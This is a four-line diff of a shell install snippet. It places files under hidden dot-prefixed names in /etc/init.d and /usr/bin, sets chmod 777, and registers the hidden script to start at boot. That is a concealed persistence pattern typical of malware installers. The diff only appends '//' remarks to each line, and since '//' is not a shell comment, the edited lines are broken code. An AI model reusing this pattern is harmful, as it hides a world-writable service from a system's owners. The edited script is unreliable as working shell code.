@@ -1,4 +1,4 @@
-mv init /etc/init.d/.handler
-chmod 777 /etc/init.d/.handler
-mv handler /usr/bin/.handler
-update-rc.d .handler defaults
+mv init /etc/init.d/.handler //added "." to handler
+chmod 777 /etc/init.d/.handler //added "." to handler
+mv handler /usr/bin/.handler //added "." to handler
+update-rc.d .handler defaults //added "." to handler
